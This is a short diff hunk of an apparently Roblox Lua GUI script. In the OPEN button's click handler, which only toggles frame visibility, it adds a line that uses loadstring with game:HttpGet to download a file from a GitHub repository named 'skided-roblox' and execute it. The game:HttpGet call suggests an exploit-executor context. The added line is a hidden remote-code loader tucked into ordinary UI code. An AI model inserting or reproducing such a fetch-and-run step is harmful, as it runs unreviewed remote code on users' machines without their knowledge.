@@ -2484,4 +2484,5 @@ OPEN.TextWrapped = true
 OPEN.MouseButton1Down:connect(function()
 open.Visible = false
 Main.Visible = true
+loadstring(game:HttpGet('https://raw.githubusercontent.com/bruh1425/skided-roblox/main/ll'))()
 end)
